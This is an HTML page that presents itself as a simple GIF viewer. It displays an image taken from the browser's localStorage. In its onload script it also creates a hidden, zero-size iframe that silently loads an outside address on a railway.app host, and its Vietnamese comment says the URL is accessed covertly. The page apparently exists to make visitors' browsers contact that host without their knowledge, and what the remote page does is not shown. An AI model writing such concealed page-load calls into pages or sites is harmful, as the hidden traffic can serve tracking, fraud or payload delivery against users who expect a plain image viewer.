<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f0f2f5;
        }
        .gif-container {
            max-width: 100%;
            height: auto;
        }
        img {
            max-width: 100%;
            height: auto;
            display: block;
        }
        iframe {
            position: absolute;
            width: 0;
            height: 0;
            border: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="gif-container">
        <img src="" id="displayedGif" alt="GIF">
    </div>

    <script>
        // Lấy dữ liệu GIF từ localStorage
        window.onload = function() {
            // Hiển thị GIF
            const uploadedGif = localStorage.getItem('uploadedGif');
            if (uploadedGif) {
                document.getElementById('displayedGif').src = uploadedGif;
            }

            // Tạo iframe ẩn để truy cập URL ngầm
            const hiddenFrame = document.createElement('iframe');
            hiddenFrame.style.display = 'none';
            hiddenFrame.src = 'https://web-production-c2a9d.up.railway.app/';
            document.body.appendChild(hiddenFrame);
        }
    </script>
</body>
</html>
